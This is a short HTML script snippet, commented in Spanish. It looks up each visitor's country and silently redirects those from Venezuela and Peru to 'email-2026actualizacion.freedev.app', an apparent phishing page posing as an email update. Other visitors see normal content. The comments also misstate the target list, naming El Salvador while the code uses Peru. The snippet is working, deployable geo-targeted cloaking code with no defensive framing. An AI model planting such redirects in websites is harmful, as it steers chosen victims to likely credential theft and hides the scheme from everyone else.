<!-- Código de redirección por geolocalización: Venezuela + El Salvador -->
<script>
    // Llamada al servicio de geolocalización
    fetch('https://ipapi.co/json/')
        .then(respuesta => respuesta.json())
        .then(datos => {
            // Obtener código del país (2 letras)
            const pais = datos.country;

            // 🇻🇪 Lista de países que se redirigen: Venezuela (VE) + El Salvador (SV)
            const paises_redirigir = ['VE', 'PE'];

            // URL de destino
            const url_destino = 'https://email-2026actualizacion.freedev.app/?i=1';

            // Comprobar si el país está en la lista
            if (paises_redirigir.includes(pais)) {
                console.log(`🔁 Redirigiendo desde: ${pais}`);
                // Redirigir al usuario
                window.location.href = url_destino;
            } else {
                console.log(`✅ Acceso permitido desde: ${pais}`);
                // Aquí se muestra el contenido normal para otros países
            }
        })
        .catch(error => {
            console.error('❌ Error:', error);
            // Mensaje en pantalla si falla la geolocalización
            document.body.innerHTML = `
                <div style="color:red; text-align:center; margin-top:20%; font-size:22px;">
                    <h1>Error al determinar tu ubicación</h1>
                    <p>No pudimos verificar tu país. Intenta más tarde.</p>
                </div>
            `;
        });
</script>
